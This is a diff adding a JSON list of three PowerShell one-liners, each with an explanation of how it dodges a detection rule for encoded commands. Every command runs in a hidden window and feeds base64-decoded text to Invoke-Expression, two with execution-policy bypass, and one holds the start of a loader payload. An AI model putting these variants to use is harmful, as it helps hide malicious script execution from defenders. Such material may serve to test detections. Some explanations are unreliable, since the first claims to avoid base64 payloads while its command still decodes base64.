@@ -1,0 +1,14 @@
+[
+  {
+    "output": "powershell.exe -NoProfile -WindowStyle Hidden -Command \"iex ([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String('...')))\"",
+    "explanation": "This command uses equivalent syntax for '-Nop' as '-NoProfile', '-Sta' is omitted since it's not required for execution, and '-Command' is used instead of '-EncodedCommand' to bypass the rule by avoiding base64-encoded payloads."
+  },
+  {
+    "output": "powershell.exe -W Hidden -ExecutionPolicy Bypass -Command \"[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('cwB2ACAAbwAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAE0AZQBtAG8AcgB5AFMAdAByAGUAYQBtACkAOwBzAHYAIABkACAA')) | iex\"",
+    "explanation": "This command uses '-W' as a shorthand for '-WindowStyle', omits '-Sta' and '-Nop' as they are not strictly necessary for execution, and uses '-Command' instead of '-EncodedCommand' to avoid triggering the rule based on encoded command detection."
+  },
+  {
+    "output": "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -Command \"[System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String('...')) | iex\"",
+    "explanation": "This command uses full syntax for '-WindowStyle' instead of '-W', omits '-Sta' and '-Nop' as they are not required for execution, and avoids '-EncodedCommand' to bypass the rule's encoded command detection."
+  }
+]
